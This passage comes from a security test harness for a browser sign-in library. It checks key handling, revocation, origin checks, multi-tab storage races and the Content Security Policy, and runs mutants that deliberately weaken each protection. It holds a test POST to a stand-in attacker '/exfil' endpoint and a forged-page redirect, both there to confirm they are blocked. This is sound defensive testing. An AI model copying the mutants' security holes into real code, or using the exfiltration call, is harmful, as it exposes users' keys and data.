      [kept.state === 'signed-in' && keptHeld, `an incident that closed before this ceremony changes nothing (${kept.state})`],
      [ended.state === 'ended' && ended.why === 'incident' && !h.held && h.last?.why === 'incident', `one that covers it deletes the keys: "${ended.text}"`],
      [inside.box.state !== 'signed-in' && inside.box.reason === 'incident', `no sign-in while an incident covers it (${inside.box.reason})`],
      [after.box.state === 'signed-in', `after the window a new ceremony signs in (${after.box.state})`],
    ]
  },

  async 'a key the directory revoked ends the sign-in'(dist) {
    const st = await session(dist)
    await ceremony(st)
    const W = (await held(st)).held?.Wpub
    st.dir.revoked.add(W)
    const b = await reload(st)
    const h = await held(st)
    await close(st)
    return [[b.state === 'ended' && b.why === 'revoked' && !h.held, `ended and the keys deleted: "${b.text}"`]]
  },

  async 'only the sign-in host, in the window the library opened, is heard'(dist) {
    const st = await session(dist)
    const r = await ceremony(st, {
      during: async (pop) => {
        // the sign-in window goes to another site, which posts "cancelled" and "failed" to the library
        await pop.evaluate((u) => { location.href = u }, ATTACKER + '/forge').catch(() => {})
        await until(async () => st.attackerHits.length > 0, 4000)
        await sleep(1200)
        st.mid = await box(st)
        await pop.close()
      },
    })
    await close(st)
    return [
      [st.attackerHits.length > 0, 'positive control: the forged page loaded in the sign-in window'],
      [st.mid?.state === 'working' && st.mid?.reason === '', `the forged messages changed nothing (${st.mid?.state}, ${st.mid?.reason || 'no reason'})`],
      [r.box.state === 'none' && r.box.reason === 'closed', `closing the window ends the attempt (${r.box.reason})`],
    ]
  },

  async "\"Confirm it's you\" never switches accounts"(dist) {
    const st = await session(dist)
    await ceremony(st)
    const one = (await held(st)).held
    await st.setTime(T0 + 6 * DAY + HOUR)
    await reload(st)
    await setAccount(st, BOB)
    const c = await ceremony(st)
    const two = (await held(st)).held
    await close(st)
    return [
      [st.dir.log.some((x) => x.k === 'enrol' && x.address === BOB), "positive control: the sign-in host certified a key for bob's account"],
      [c.box.reason === 'account' && c.box.text.includes(`Signed in as ${ADDRESS}`) && two?.Wpub === one?.Wpub, `refused, still ${ADDRESS} with the same keys: "${c.box.text}"`],
    ]
  },

  async 'a certificate is accepted only for the keys the library sent'(dist) {
    const st = await session(dist, { sEdit: S_SWAP_KX })
    const c = await ceremony(st)
    const h = await held(st)
    const e = st.dir.log.find((x) => x.k === 'enrol')
    await close(st)
    return [
      [e?.kx === EVIL_KX, 'positive control: the directory certified the substituted key-agreement key'],
      [c.box.state === 'none' && c.box.reason === 'not-ours' && !h.held, `refused, nothing kept (${c.box.reason})`],
    ]
  },

  async 'a countersign longer than 24 hours is refused (kernel verifyDevice)'(dist) {
    const st = await session(dist)
    st.dir.hostile.watt48h = true
    const c = await ceremony(st)
    const h = await held(st)
    await close(st)
    return [[c.box.state === 'none' && c.box.reason === 'device-watt-lifetime' && !h.held, `refused, nothing kept (${c.box.reason})`]]
  },

  async 'a roster countersigned by a key the build does not pin is refused, whatever the answer offers'(dist) {
    const st = await session(dist)
    st.dir.hostile.rogue = ROGUE
    const c = await ceremony(st)
    const h = await held(st)
    await close(st)
    return [[c.box.state === 'none' && /^roster-/.test(c.box.reason) && !h.held, `refused, nothing kept (${c.box.reason})`]]
  },

  async 'a key a build left exportable is dropped on load'(dist) {
    // another build of the library (a hostile deploy, or a bug) made the keys exportable and signed in;
    // the build under test then loads what it left in IndexedDB
    const st = await session(plantingBuild())
    const c = await ceremony(st)
    const planted = (await held(st)).held
    st.serve(dist)
    const b = await reload(st)
    const h = await held(st)
    await close(st)
    return [
      [c.box.state === 'signed-in' && planted?.W.ext === true && planted?.W.pkcs8 === 'exported',
        `positive control: the other build signed in with a key that exports (${c.box.state}, ${planted?.W.pkcs8})`],
      [b.state === 'ended' && b.why === 'invalid' && !h.held && h.last?.why === 'invalid', `dropped on load: "${b.text}"`],
    ]
  },

  async 'a check-in in flight never writes back a sign-in that was signed out or replaced'(dist, edits) {
    // node: the agent from home/web/src (with the mutant's edits, if any) against the stub; the event lands
    // while checkIn awaits its verify, after the network answered
    const { Agent } = await agentModule(edits)
    const out = []
    for (const variant of ['control', 'sign-out', 'newer record', 'sign-out in the write']) {
      const n = { right: 0, wrong: 0 }
      for (let i = 0; i < 5; i++) {
        const { agent, store, h0, fire } = await raceSetup(Agent)
        const h1 = variant === 'newer record' ? await heldRecord(raceDir) : null
        if (variant === 'sign-out') fire.hook = () => { void agent.signOut() }
        // what signIn's last step does
        if (variant === 'newer record') fire.hook = () => { void store.put(h1).then(() => { agent['held'] = h1 }) }
        // lands after the renewal is written and before the write is reported
        if (variant === 'sign-out in the write') fire.onPut = () => { void agent.signOut() }
        await agent.checkIn()
        await sleep(30)
        const rec = store.rec().held, mem = agent['held']
        const right = variant === 'control' ? rec?.Wpub === h0.Wpub && mem?.Wpub === h0.Wpub && rec.watt !== h0.watt
          : variant === 'sign-out' || variant === 'sign-out in the write' ? !rec && !mem
          : rec?.Wpub === h1.Wpub && mem === h1
        right ? n.right++ : n.wrong++
      }
      out.push([n.wrong === 0, `${variant}${variant === 'control' ? ' (nothing lands: the check-in writes its renewal)' : (variant === 'sign-out in the write' ? ' (the renewal written, not yet reported): ' : ' lands mid check-in: ') + (variant === 'newer record' ? 'the newer record stays' : 'nothing comes back')} (${n.right}/5)`])
    }
    return out
  },

  async 'two tabs: a check-in writes only over the record it renewed'(dist, edits) {
    // node: two agents on one store, as two tabs of the library share IndexedDB
    const { Agent } = await agentModule(edits)
    const out = []
    for (const variant of ['B signs out', 'B signs in anew', 'B signs in anew, A\'s old key is revoked']) {
      const n = { right: 0, wrong: 0 }
      for (let i = 0; i < 3; i++) {
        const { agent: A, store, h0, net } = await raceSetup(Agent)
        const B = new Agent(store, net, () => raceClock)
        await B.load()
        let h1 = null
        if (variant === 'B signs out') await B.signOut()
        else {
          h1 = await heldRecord()
          await store.put(h1)                     // what a ceremony in tab B writes
          await B.load()
          if (variant.endsWith('revoked')) raceDir.revoked.add(h0.Wpub)
        }
        const s = await A.checkIn()
        const rec = store.rec().held
        const right = variant === 'B signs out' ? !rec && s.kind === 'none' && !A['held']
          : rec?.Wpub === h1.Wpub && A['held']?.Wpub === h1.Wpub
        right ? n.right++ : n.wrong++
      }
      out.push([n.wrong === 0, `${variant}, then A checks in: ${variant === 'B signs out' ? 'nothing comes back, A shows signed out' : "B's sign-in stays, and A takes it"} (${n.right}/3)`])
    }
    return out
  },

  async 'a store that fails never stops the check-in'(dist, edits) {
    const { Agent } = await agentModule(edits)
    const { agent, fire } = await raceSetup(Agent)
    fire.failPut = true
    let s, err = null
    try { s = await agent.checkIn() } catch (e) { err = e.name }
    return [[err === null && s?.kind === 'signed-in', `checkIn resolves, still signed in (${err ?? s?.kind})`]]
  },

  async "two tabs on the browser's real IndexedDB: only the record a write was made from is replaced"(dist, edits) {
    // the shipped store (indexedStore: the read and the write in one transaction), not a model of it
    const out = []
    const at = async (tabs, t) => { raceClock = t; for (const p of [tabs.a, tabs.b]) await p.evaluate((c) => { window.CLOCK = c }, t) }
    for (const variant of ['B signs out', 'B signs in anew', "A's load ends a bad record as B signs in"]) {
      const n = { right: 0, wrong: 0 }
      let seen = ''
      for (let i = 0; i < 2; i++) {
        const tabs = await twoTabs(edits)
        const { a, b } = tabs
        await at(tabs, T0 + HOUR)
        let wB = null, r
        if (variant === "A's load ends a bad record as B signs in") {
          // A reads a record that fails its check; B's new sign-in lands between A's read and A's end
          await a.evaluate(async () => { await window.seed(); const S = B.indexedStore, g = await S.get(); await S.put({ ...g.held, cert: g.held.cert + 'x' }) })
          await at(tabs, T0 + 2 * HOUR)
          await a.exposeFunction('__bSeed', () => b.evaluate(() => window.seed()))
          r = await a.evaluate(async () => {
            const S = B.indexedStore
            let first = true
            const store = { put: S.put, end: S.end, get: async () => { const g = await S.get(); if (first) { first = false; window.wB = await window.__bSeed() } return g } }
            const k = await window.newAgent(store)
            const st = await window.stored()
            return { status: k, mem: window.mem(), W: st.W, last: st.last, wB: window.wB }
          })
          wB = r.wB
        } else {
          await a.evaluate(() => window.seed())
          await at(tabs, T0 + 2 * HOUR)
          await a.evaluate(() => window.newAgent()); await b.evaluate(() => window.newAgent())
          if (variant === 'B signs out') await b.evaluate(() => window.agent.signOut())
          else wB = await b.evaluate(async () => { const w = await window.seed(); await window.newAgent(); return w })
          r = await a.evaluate(async () => {
            const s = await window.agent.checkIn()
            const st = await window.stored()
            return { status: s.kind, mem: window.mem(), W: st.W, last: st.last }
          })
        }
        const right = variant === 'B signs out' ? r.W === null && r.mem === null && r.status === 'none'
          : r.W === wB && r.mem === wB && r.status === 'signed-in' && r.last === null
        right ? n.right++ : n.wrong++
        seen = `A ${r.status}, store ${r.W === null ? 'empty' : r.W === wB ? "B's" : 'another key'}`
        await tabs.ctx.close()
      }
      out.push([n.wrong === 0, `${variant}: ${variant === 'B signs out' ? 'the store stays empty and A shows signed out' : "B's sign-in stays and A takes it"} (${n.right}/2; last: ${seen})`])
    }
    return out
  },

  async 'the policy: the release channel and the directory only, Trusted Types required'(dist) {
    const info = JSON.parse(readFileSync(join(dist, 'build.json'), 'utf8'))
    const hdr = readFileSync(join(dist, 'library/_headers'), 'utf8')
    const st = await session(dist)
    const sent = await st.page.evaluate((u) => fetch(u, { method: 'POST', body: 'x' }).then(() => 'sent', (e) => e.name), ATTACKER + '/exfil')
    await sleep(200)
    const tt = await st.page.evaluate(() => { try { document.getElementById('id-text').innerHTML = '<b>x</b>'; return 'assigned' } catch (e) { return e.name } })
    await close(st)
    return [
      [/connect-src https:\/\/bento\.page\/releases\/ https:\/\/id\.bento\.page;/.test(info.libraryPolicy) && hdr.includes('connect-src https://bento.page/releases/ https://id.bento.page;'),
        'connect-src is exactly the release channel and the directory, in the meta policy and the header'],
      [/require-trusted-types-for 'script'; trusted-types 'none'/.test(info.libraryPolicy) && /frame-ancestors 'none'/.test(hdr) && /Cross-Origin-Opener-Policy: same-origin-allow-popups/.test(hdr),
        "Trusted Types required with no policy; frame-ancestors 'none'; COOP same-origin-allow-popups (never same-origin: it would cut the sign-in window off)"],
      [sent === 'TypeError' && st.attackerHits.length === 0, `a request to another site is blocked before it leaves (${sent}, ${st.attackerHits.length} seen)`],
      [tt === 'TypeError', `a markup sink throws (${tt})`],
    ]
  },
}

// ---- mutants: [the row that must go red, the edits (home/web/src) or a dist edit] -------------------
const A = (file, from, to) => ({ file, from, to })
const MUTANTS = {
  'keys-extractable': ['W and kx are non-extractable', [
    A('identity.ts', "{ name: 'ECDSA', namedCurve: 'P-256' }, false, ['sign']", "{ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign']"),
    A('identity.ts', "{ name: 'ECDH', namedCurve: 'P-256' }, false, ['deriveBits']", "{ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits']")]],
  'keys-reused': ['every ceremony makes fresh keys, and the old ones are gone', [
    A('identity.ts', '      const k = await freshKeys()\n', '      const k = this.held ? { W: this.held.W, kx: this.held.kx, Wpub: this.held.Wpub, kxPub: this.held.kxPub } : await freshKeys()\n')]],
  'webauthn-in-home': ['the library runs no WebAuthn and never calls the Signal API', [
    A('identity.ts', '      const label = browserLabel()\n', "      const label = browserLabel()\n      await navigator.credentials.get({ publicKey: { rpId: 'id.bento.page', challenge: new Uint8Array(32), allowCredentials: [] } }).catch(() => null)\n")]],
  'signal-on-sign-out': ['the library runs no WebAuthn and never calls the Signal API', [
    A('identity.ts', '    this.last = null\n    await this.store.end(null)\n',
      "    this.last = null\n    await (PublicKeyCredential as any).signalAllAcceptedCredentials({ rpId: 'id.bento.page', userId: 'AA', allAcceptedCredentialIds: [] }).catch(() => null)\n    await this.store.end(null)\n")]],
  'keys-from-answer': ['a roster countersigned by a key the build does not pin is refused, whatever the answer offers', [
    A('identity.ts', '  return { watt: b.watt, wattSig: b.wattSig,', '  return { ...(b as any), watt: b.watt, wattSig: b.wattSig,'),
    A('identity.ts', '    const opts = { directoryKeys: DIR_KEYS,', '    const opts = { directoryKeys: { ...DIR_KEYS, ...((a as any).keys ?? {}) },')]],
  'device-unverified': ['a countersign longer than 24 hours is refused (kernel verifyDevice)', [
    A('identity.ts', "    if (!dv.ok) return no(`device-${dv.reason}`)\n    return { ok: true as const, value: dv.value }",
      '    if (!dv.ok) return { ok: true as const, value: { watt: parseWatt(a.watt).value as any, cert: ((await parseDeviceCert(cert)) as any).value } }\n    return { ok: true as const, value: dv.value }')]],
  'no-confirm-ahead': ["a day before the 7-day cap the library asks \"Confirm it's you\"", [
    A('identity.ts', 'export const CONFIRM_BEFORE_MS = 24 * HOUR', 'export const CONFIRM_BEFORE_MS = 0')]],
  'no-check-in-on-load': ['the countersign is renewed by a check-in signed by W', [
    A('identity-ui.ts', '  render(await agent.load())\n  render(await agent.checkIn())\n', '  render(await agent.load())\n')]],
  'incident-ignored': ['an incident record covering the ceremony ends the sign-in; an earlier one does not', [
    A('identity.ts', "    if (r.incidents.some((i) => covers(i, h.ceremonyAt))) return (await this.end(h.address, 'incident', h.Wpub)) ? this.status() : this.load()\n", '')]],
  'revoked-ignored': ['a key the directory revoked ends the sign-in', [
    A('identity.ts', "      if (r.refused === 'revoked' || r.refused === 'unknown') return (await this.end(h.address, 'revoked', h.Wpub)) ? this.status() : this.load()\n", '')]],
  'reply-any-origin': ['only the sign-in host, in the window the library opened, is heard', [
    A('identity.ts', '      if (e.source !== win || e.origin !== SIGNIN_ORIGIN) return', '      if (e.source !== win) return')]],
  'account-switch': ["\"Confirm it's you\" never switches accounts", [
    A('identity.ts', "      if (expect !== null && cert.address !== expect) return no('account')\n", '')]],
  'not-ours': ['a certificate is accepted only for the keys the library sent', [
    A('identity.ts', "      if (cert.devicePub !== k.Wpub || cert.kx !== k.kxPub || cert.label !== label) return no('not-ours')\n", '')]],
  'keys-unchecked': ['a key a build left exportable is dropped on load', [
    A('identity.ts', "    if (!ok(h.W, 'ECDSA', 'sign') || !ok(h.kx, 'ECDH', 'deriveBits')) return false\n", '')]],
  // The re-check after the verify and the conditional write each close this window alone (the second also covers
  // other tabs), so the mutant removes both: the row must see the race itself.
  'write-back-after-verify': ['a check-in in flight never writes back a sign-in that was signed out or replaced', [
    A('identity.ts', '    if (this.held !== h) return this.status()\n    if (!v.ok)', '    if (!v.ok)'),
    A('identity.ts', 'await this.store.put(next, h.Wpub)', 'await this.store.put(next)')]],
  'held-after-put': ['a check-in in flight never writes back a sign-in that was signed out or replaced', [
    A('identity.ts', '    this.held = next\n    // only over the record this check-in renewed: another tab\'s sign-out or new sign-in stands\n    if (!(await this.store.put(next, h.Wpub)) && this.held === next) return this.load()\n',
      '    if (!(await this.store.put(next, h.Wpub))) return this.load()\n    this.held = next\n')]],
  'put-unconditional': ['two tabs: a check-in writes only over the record it renewed', [
    A('identity.ts', 'await this.store.put(next, h.Wpub)', 'await this.store.put(next)')]],
  'end-unconditional': ['two tabs: a check-in writes only over the record it renewed', [
    A('identity.ts', '    if (await this.store.end(this.last, expect)) return true\n', '    if (await this.store.end(this.last)) return true\n')]],
  'store-errors-escape': ['a store that fails never stops the check-in', [
    A('identity.ts', '    try { return await this.checkInOnce() } catch { return this.status() }', '    return this.checkInOnce()')]],
  // the shipped store's one-transaction write (C5): each mutant is red only on real IndexedDB
  'swap-ignores-expect': ["two tabs on the browser's real IndexedDB: only the record a write was made from is replaced", [
    A('identity.ts', '        g.onsuccess = () => { if ((g.result as Held | undefined)?.Wpub === expect) write(s); else done = false }\n', '        g.onsuccess = () => { write(s) }\n')]],
  'swap-says-ok': ["two tabs on the browser's real IndexedDB: only the record a write was made from is replaced", [
    A('identity.ts', '        g.onsuccess = () => { if ((g.result as Held | undefined)?.Wpub === expect) write(s); else done = false }\n', '        g.onsuccess = () => { if ((g.result as Held | undefined)?.Wpub === expect) write(s) }\n')]],
  'load-end-no-expect': ["two tabs on the browser's real IndexedDB: only the record a write was made from is replaced", [
    A('identity.ts', "else if (!(await this.end(held.address, 'invalid', held.Wpub))) return this.load()", "else if (!(await this.end(held.address, 'invalid', undefined as any))) return this.load()")]],
  'connect-any': ['the policy: the release channel and the directory only, Trusted Types required', 'dist',
    (t) => t.replace('connect-src https://bento.page/releases/ https://id.bento.page', 'connect-src *')],
}

const rowHolds = async (name, dist, edits = null) => {
  let r
  try { r = await ROWS[name](dist, edits) } catch (e) { r = [[false, `crashed: ${e.message.split('\n')[0]}`]] }
  return r
}

try {
  const honest = build('honest')
  if (!MUTANTS_RUN) {
    for (const name of Object.keys(ROWS)) {
      console.log(`\n${name}`)
      for (const [c, m] of await rowHolds(name, honest)) ok(c, m)
    }
    console.log('\nisolation')
    ok(sockets.length === 0, `no WebSocket was opened (${sockets.length})`)
    ok(refused.length === 0, `nothing was fetched outside the routed origins (${JSON.stringify(refused.slice(0, 5))})`)
  } else {
    const names = ONLY && !ONLY.startsWith('--') ? [ONLY] : Object.keys(MUTANTS)
    for (const m of names) {
      const [row, edits, edit] = MUTANTS[m]
      if (!ROWS[row]) { ok(false, `MUTANT ${m}: names no row (${row})`); continue }
      const dist = edits === 'dist' ? distMutant(honest, `m-${m}`, edit) : build(`m-${m}`, edits)
      const r = await rowHolds(row, dist, edits === 'dist' ? null : edits)
      const red = r.filter(([c]) => !c).map(([, msg]) => msg)
      ok(red.length > 0, `MUTANT ${m}: red on "${row}"${red.length ? ` (${red[0]})` : ''}`)
    }
  }
} finally {
  await browser.close()
  rmSync(tmp, { recursive: true, force: true })
}
console.log(`\n${checks - failures}/${checks} checks passed`)
process.exit(failures ? 1 : 0)
